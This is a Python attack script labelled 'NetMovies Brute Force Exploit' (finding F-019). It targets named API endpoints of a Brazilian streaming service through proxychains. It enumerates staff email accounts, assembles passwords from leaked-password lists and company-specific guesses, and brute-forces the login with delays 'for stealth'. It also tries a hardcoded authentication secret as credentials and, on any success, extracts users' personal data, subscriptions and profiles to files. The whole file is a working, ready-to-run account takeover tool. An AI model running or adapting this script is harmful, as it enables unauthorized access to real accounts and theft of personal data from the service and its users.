#!/usr/bin/env python3
"""
NetMovies Brute Force Exploit
F-019: No rate limit confirmed
"""
import subprocess, json, time, os, sys, re

BASE = "/home/ubuntu/netmovies.com.br-filmenoisubtitrate.eu-filmekstra.com/webapp/netmovies"
LOG_FILE = os.path.join(BASE, "bruteforce_log.txt")
CONFIRMED_FILE = os.path.join(BASE, "confirmed_emails.txt")
EVIDENCE_DIR = "/home/ubuntu/netmovies.com.br-filmenoisubtitrate.eu-filmekstra.com/evidence"
ATTEMPTS_FILE = os.path.join(BASE, "login_attempts.txt")
PROXY = "proxychains4"
URL_VERIFY = "https://netmovies-service.ottvs.com.br/v1/android/VerifyUserExist"
URL_LOGIN = "https://netmovies-service.ottvs.com.br/v1/android/Login"
URL_LOGIN_ESS = "https://netmovies-service.ottvs.com.br/v1/android/LoginEssentials"
URL_LOGIN_ESS_CODE = "https://netmovies-service.ottvs.com.br/v1/android/LoginEssentialsByCode"
URL_LOGIN_ESS_TOKEN = "https://netmovies-service.ottvs.com.br/v1/android/LoginEssentialsWithToken"
URL_REFRESH = "https://netmovies-service.ottvs.com.br/v1/android/RefreshToken"
URL_USER_INFO = "https://netmovies-service.ottvs.com.br/v1/android/GetUserInfo"
URL_SUBSCRIPTIONS = "https://netmovies-service.ottvs.com.br/v1/android/GetSubscriptions"
URL_PROFILES = "https://netmovies-service.ottvs.com.br/v1/android/GetProfiles"
AUTH = "netmovies@netmovies:a1c2af@#$"

os.makedirs(os.path.join(BASE, "evidence"), exist_ok=True)
os.makedirs(EVIDENCE_DIR, exist_ok=True)

def req(url, payload, label=""):
    """Make request via proxychains, return (status_code, response_json, elapsed)"""
    cmd = [PROXY, "curl", "-s", "-o", "-", "-w", "%{http_code}", 
           "-X", "POST", url,
           "-H", "Content-Type: application/json",
           "-H", "User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
           "-d", json.dumps(payload),
           "--connect-timeout", "10", "--max-time", "15"]
    start = time.time()
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        elapsed = time.time() - start
        out = r.stdout.strip()
        if len(out) > 4:
            http_code = out[-3:]
            body = out[:-3]
        else:
            http_code = out
            body = ""
        try:
            j = json.loads(body)
        except:
            j = {"raw": body}
        return int(http_code), j, round(elapsed, 2)
    except Exception as e:
        return 0, {"error": str(e)}, round(time.time() - start, 2)

def log(msg):
    with open(LOG_FILE, "a") as f:
        f.write(msg + "\n")
    print(msg)

def load_already_tested():
    """Load already tested (email, password) pairs from login_attempts.txt"""
    tested = set()
    if os.path.exists(ATTEMPTS_FILE):
        with open(ATTEMPTS_FILE) as f:
            content = f.read()
        email_match = re.search(r"Email:\s*(\S+)", content)
        if email_match:
            current_email = email_match.group(1)
        else:
            current_email = None
        pw_matches = re.findall(r"Password:\s*(.+?)\n", content)
        for pw in pw_matches:
            pw = pw.strip()
            if current_email:
                tested.add((current_email, pw))
            tested.add(("any", pw))
    return tested

ALREADY_TESTED = load_already_tested()
log(f"[*] Already tested pairs loaded: {len(ALREADY_TESTED)}")

# ============================================================
# STEP 1: Enumerate MORE emails via VerifyUserExist
# ============================================================
def enum_emails():
    log("\n" + "="*60)
    log("[STEP 1] Enumerating emails via VerifyUserExist")
    
    emails = [
        "contato@netmovies.com.br",
        "admin@netmovies.com.br",
        "suporte@netmovies.com.br",
        "sac@netmovies.com.br",
        "comercial@netmovies.com.br",
        "rh@netmovies.com.br",
        "ti@netmovies.com.br",
        "financeiro@netmovies.com.br",
        "marketing@netmovies.com.br",
        "dev@netmovies.com.br",
        "teste@netmovies.com.br",
        "vendas@netmovies.com.br",
        "presidencia@netmovies.com.br",
        "ouvidoria@netmovies.com.br",
        "dns@encripta.com.br",
        "webmaster@netmovies.com.br",
        "info@netmovies.com.br",
        "atendimento@netmovies.com.br",
        "relacoespublicas@netmovies.com.br",
        "imprensa@netmovies.com.br",
        "administracao@netmovies.com.br",
        "contabilidade@netmovies.com.br",
        "diretoria@netmovies.com.br",
        "juridico@netmovies.com.br",
        "provedor@netmovies.com.br",
        "seguranca@netmovies.com.br",
        "sistemas@netmovies.com.br",
        "tecnologia@netmovies.com.br",
        "web@netmovies.com.br",
        "contato@encripta.com.br",
        "admin@encripta.com.br",
        "suporte@encripta.com.br",
        "sac@encripta.com.br",
        "comercial@encripta.com.br",
    ]
    
    confirmed_emails = []
    for i, email in enumerate(emails):
        payload = {
            "Email": email,
            "AuthenticationTicket": AUTH
        }
        http_code, j, elapsed = req(URL_VERIFY, payload)
        exists = j.get("VerifyUserExistResult", {}).get("Exists", False)
        log(f"Email:{email} HTTP:{http_code} Exists:{exists} Time:{elapsed}s")
        
        if exists:
            confirmed_emails.append(email)
            log(f"  >>> CONFIRMED: {email}")
        
        if (i+1) % 10 == 0:
            time.sleep(0.5)
    
    # Save confirmed emails
    with open(CONFIRMED_FILE, "w") as f:
        f.write("=== USUARIOS CONFIRMADOS ===\n")
        f.write(f"Total: {len(confirmed_emails)}\n\n")
        for e in confirmed_emails:
            f.write(f"[EXISTS] {e}\n")
    
    log(f"[*] Total confirmed emails: {len(confirmed_emails)}")
    return confirmed_emails

# ============================================================
# STEP 2: Build comprehensive password list
# ============================================================
def build_password_list():
    log("\n" + "="*60)
    log("[STEP 2] Building comprehensive password list")
    
    wordlist_files = [
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-65.txt",
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/2024-197_most_used_passwords.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/2025-199_most_used_passwords.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/worst-passwords-2017-top100-slashdata.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Portugese_Pwdb_common-password-list-top-150.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/Language-Specific/Spanish_common-usernames-and-passwords.txt",
        "/usr/share/seclists/Passwords/stupid-ones-in-production.txt",
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-05.txt",
    ]
    
    passwords = set()
    for wf in wordlist_files:
        if os.path.exists(wf):
            with open(wf, errors='ignore') as f:
                for line in f:
                    pw = line.strip()
                    if pw and len(pw) < 100:
                        passwords.add(pw)
            log(f"  Loaded {wf}: {sum(1 for _ in open(wf, errors='ignore'))} lines")
        else:
            log(f"  MISSING: {wf}")
    
    # Context-specific passwords for NetMovies
    context_passwords = [
        "encripta2024", "encripta2023", "encripta", "Encripta2024",
        "dns@encripta.com.br", "spinasse", "marcelo",
        "ottvs", "ottvs2024", "OTTvs", "OTTVs2024",
        "netmovies@2024", "NetMovies2024!", "NetMovies2024",
        "a1c2af@#$", "a1c2af", "netmovies@netmovies",
        "netmovies@netmovies:a1c2af@#$",
        "NetMovies", "netmovies", "Netmovies",
        "netmovies123", "NetMovies123", "nm2024", "NM2024",
        "netmovies2024", "NETMOVIES2024",
        "filmes", "series", "streaming",
        "NetMovies@2024", "netmovies@2024",
        "netmovies1", "netmovies@123", "@netmovies2024",
        "nm123", "NetMovies123!", "NetMovies2024!",
        "contato@netmovies.com.br", "admin@netmovies.com.br",
        "suporte@netmovies.com.br", "info@netmovies.com.br",
        "sac@netmovies.com.br", "comercial@netmovies.com.br",
        "NetMovies1", "netmovies!2024",
        "NetMovies@2025", "NetMovies@2023",
        "ottvs2025", "ottvs2023",
        "spinasse2024", "marcelo2024",
        "NetMovies2025", "netmovies2025",
        "netmovies@netmovies2024", "admin@123",
        "NetMovies@#$", "netmovies@#$",
        "123mudar", "mudar123", "mudar@2024",
        "NetMovies@2024!", "NetMovies@2024",
        "assinante", "NetMovies@dm1n",
        "netmovies_admin", "admin_netmovies",
        "ottvs@2024", "ottvs@netmovies",
        "NetMovies2023", "netmovies2023",
        "netmovies@ottvs", "ottvs@2024",
        "a1c2af@#$2024", "a1c2af2024",
        "netmovies@2024!", "@netmovies",
        "planos", "NetMoviesPlanos",
        "NetMoviesNet", "NMNet",
        "trial", "teste123",
        "senha123", "senha456",
        "NetMovies@123", "NM@2024",
    ]
    passwords.update(context_passwords)
    log(f"  Added {len(context_passwords)} context-specific passwords")
    
    # Remove already-tested passwords
    tested_pws = {pw for _, pw in ALREADY_TESTED}
    before = len(passwords)
    passwords -= tested_pws
    log(f"  Removed {before - len(passwords)} already-tested passwords")
    log(f"  Total unique passwords to test: {len(passwords)}")
    
    return list(passwords)

# ============================================================
# STEP 3: Brute force login
# ============================================================
def try_login(email, password):
    payload = {
        "Username": email,
        "Password": password,
        "AuthenticationTicket": AUTH,
        "Platform": "web"
    }
    http_code, j, elapsed = req(URL_LOGIN, payload)
    
    result = j.get("LoginResult", {}).get("Result", -2)
    msg = j.get("LoginResult", {}).get("Message", "")
    
    # Log every attempt
    log_msg = f"Email:{email} Password:{password} HTTP:{http_code} Result:{result} Msg:{msg} Time:{elapsed}s"
    log(log_msg)
    
    # Save to login_attempts.txt
    with open(ATTEMPTS_FILE, "a") as f:
        f.write(f"\nEmail: {email}\nPassword: {password}\nResult: {result}\nResponse: {json.dumps(j)}\n")
    
    return result == 0, j, elapsed

def brute_force(emails, passwords):
    log("\n" + "="*60)
    log(f"[STEP 3] Brute force login with {len(passwords)} passwords against {len(emails)} emails")
    
    found = []
    total_attempts = len(emails) * len(passwords)
    attempts = 0
    
    for email in emails:
        for password in passwords:
            # Skip if already tested for this email
            if (email, password) in ALREADY_TESTED:
                continue
            
            attempts += 1
            success, j, elapsed = try_login(email, password)
            
            if success:
                log(f"\n  >>>>>>> CREDENTIAL FOUND! <<<<<<<")
                log(f"  Email: {email}")
                log(f"  Password: {password}")
                found.append((email, password, j))
                
                # Save evidence
                save_evidence(email, password, j)
                
                # Extract user data
                extract_user_data(email, password)
                
                return found  # Exit on first success
            
            if attempts % 10 == 0:
                pct = round(attempts/total_attempts*100, 1)
                log(f"  Progress: {attempts}/{total_attempts} ({pct}%)")
            
            # Small delay for stealth
            time.sleep(0.3)
    
    log(f"\n[*] Brute force completed: {attempts} attempts, {len(found)} credentials found")
    return found

# ============================================================
# STEP 4: Try alternative endpoints
# ============================================================
def try_alternative_endpoints():
    log("\n" + "="*60)
    log("[STEP 4] Trying alternative endpoints")
    
    alt_attempts = [
        ("LoginEssentials", URL_LOGIN_ESS, {"Username":"contato@netmovies.com.br","Password":"netmovies@netmovies:a1c2af@#$","AuthenticationTicket":AUTH}),
        ("LoginEssentials", URL_LOGIN_ESS, {"Username":"contato@netmovies.com.br","Password":"a1c2af@#$","AuthenticationTicket":AUTH}),
        ("LoginEssentialsByCode", URL_LOGIN_ESS_CODE, {"Email":"contato@netmovies.com.br","Code":"123456","AuthenticationTicket":AUTH}),
        ("LoginEssentialsByCode", URL_LOGIN_ESS_CODE, {"Email":"contato@netmovies.com.br","Code":"0000","AuthenticationTicket":AUTH}),
        ("LoginEssentialsWithToken", URL_LOGIN_ESS_TOKEN, {"Token":"netmovies@netmovies:a1c2af@#$","AuthenticationTicket":AUTH}),
        ("RefreshToken", URL_REFRESH, {"RefreshToken":"","AuthenticationTicket":AUTH}),
    ]
    
    for name, url, payload in alt_attempts:
        http_code, j, elapsed = req(url, payload)
        result = j.get(f"{name}Result", {}).get("Result", j.get("Result", -2))
        msg = j.get(f"{name}Result", {}).get("Message", "")
        log(f"Endpoint:{name} HTTP:{http_code} Result:{result} Msg:{msg} Time:{elapsed}s")
        log(f"  Payload: {json.dumps(payload)}")
        log(f"  Response: {json.dumps(j)[:300]}")
        
        if result == 0 or (isinstance(j, dict) and "Token" in j):
            log(f"  >>> SUCCESS on alternative endpoint! <<<")
            with open(os.path.join(EVIDENCE_DIR, "F-019-alt-endpoint-success.txt"), "w") as f:
                f.write(f"Endpoint: {name}\nURL: {url}\nPayload: {json.dumps(payload)}\nResponse: {json.dumps(j)}\n")
            return name, j
        time.sleep(0.3)
    
    return None, None

# ============================================================
# STEP 5: Try secret as credentials
# ============================================================
def try_secret_as_credentials():
    log("\n" + "="*60)
    log("[STEP 5] Trying secret as credentials")
    
    secret_attempts = [
        ("netmovies", "netmovies@netmovies:a1c2af@#$"),
        ("netmovies", "a1c2af@#$"),
        ("netmovies", "netmovies@netmovies"),
        ("admin", "netmovies@netmovies:a1c2af@#$"),
        ("contato@netmovies.com.br", "netmovies@netmovies:a1c2af@#$"),
        ("netmovies@netmovies", "a1c2af@#$"),
        ("netmovies-service", "a1c2af@#$"),
        ("ottvs", "netmovies@netmovies:a1c2af@#$"),
        ("admin", "a1c2af@#$"),
    ]
    
    for username, password in secret_attempts:
        payload = {
            "Username": username,
            "Password": password,
            "AuthenticationTicket": AUTH,
            "Platform": "web"
        }
        http_code, j, elapsed = req(URL_LOGIN, payload)
        result = j.get("LoginResult", {}).get("Result", -2)
        msg = j.get("LoginResult", {}).get("Message", "")
        log(f"User:{username} Pass:{password} HTTP:{http_code} Result:{result} Msg:{msg} Time:{elapsed}s")
        
        if result == 0:
            log(f"  >>> CREDENTIAL FOUND via secret! <<<")
            save_evidence(username, password, j)
            return username, password, j
        time.sleep(0.3)
    
    return None, None, None

# ============================================================
# Evidence & Data Extraction
# ============================================================
def save_evidence(email, password, response):
    ev_file = os.path.join(EVIDENCE_DIR, "F-019-credentials-found.txt")
    with open(ev_file, "w") as f:
        f.write("=== CREDENTIAL FOUND - F-019 ===\n\n")
        f.write(f"Email: {email}\n")
        f.write(f"Password: {password}\n\n")
        f.write(f"Payload:\n")
        f.write(json.dumps({"Username": email, "Password": password, "AuthenticationTicket": AUTH, "Platform": "web"}, indent=2) + "\n\n")
        f.write(f"Response:\n")
        f.write(json.dumps(response, indent=2) + "\n\n")
        f.write("Impact: GetUserInfo (PII), GetProfiles, GetSubscriptions\n")
    log(f"[*] Evidence saved to {ev_file}")

def extract_user_data(email, password):
    payload = {
        "AuthenticationTicket": AUTH
    }
    if password:
        payload["Password"] = password
        payload["Username"] = email
    
    # GetUserInfo
    log("[*] Extracting GetUserInfo...")
    http_code, j, elapsed = req(URL_USER_INFO, {"AuthenticationTicket": AUTH, "Username": email, "Password": password})
    log(f"  GetUserInfo HTTP:{http_code} Time:{elapsed}s")
    log(f"  Response: {json.dumps(j)[:500]}")
    
    # GetSubscriptions
    log("[*] Extracting GetSubscriptions...")
    http_code2, j2, elapsed2 = req(URL_SUBSCRIPTIONS, {"AuthenticationTicket": AUTH, "Username": email, "Password": password})
    log(f"  GetSubscriptions HTTP:{http_code2} Time:{elapsed2}s")
    log(f"  Response: {json.dumps(j2)[:500]}")
    
    # GetProfiles
    log("[*] Extracting GetProfiles...")
    http_code3, j3, elapsed3 = req(URL_PROFILES, {"AuthenticationTicket": AUTH, "Username": email, "Password": password})
    log(f"  GetProfiles HTTP:{http_code3} Time:{elapsed3}s")
    log(f"  Response: {json.dumps(j3)[:500]}")
    
    # Save all data
    data_file = os.path.join(BASE, f"user_data_{email}.json")
    with open(data_file, "w") as f:
        json.dump({
            "email": email,
            "password": password,
            "GetUserInfo": j,
            "GetSubscriptions": j2,
            "GetProfiles": j3
        }, f, indent=2)
    log(f"[*] User data saved to {data_file}")

# ============================================================
# MAIN
# ============================================================
def main():
    start_time = time.time()
    log("="*60)
    log("NetMovies Brute Force Exploit - F-019")
    log("="*60)
    
    # Step 1: Enumerate emails
    emails = enum_emails()
    
    # Always include contato@netmovies.com.br even if not in results
    if "contato@netmovies.com.br" not in emails:
        emails.insert(0, "contato@netmovies.com.br")
    
    if not emails:
        log("[!] No emails confirmed. Using contato@netmovies.com.br as target.")
        emails = ["contato@netmovies.com.br"]
    
    # Step 2: Build password list
    passwords = build_password_list()
    
    if not passwords:
        log("[!] No passwords to test!")
        return
    
    # Step 3: Brute force
    found = brute_force(emails, passwords)
    
    # Step 4: Alternative endpoints
    if not found:
        alt_result = try_alternative_endpoints()
    
    # Step 5: Secret as credentials
    if not found:
        secret_result = try_secret_as_credentials()
    
    elapsed_total = time.time() - start_time
    log(f"\n" + "="*60)
    log(f"[COMPLETE] Total time: {round(elapsed_total, 1)}s")
    log(f"Credentials found: {len(found)}")
    
    if found:
        for e, p, j in found:
            log(f"  Email: {e}")
            log(f"  Password: {p}")

if __name__ == "__main__":
    main()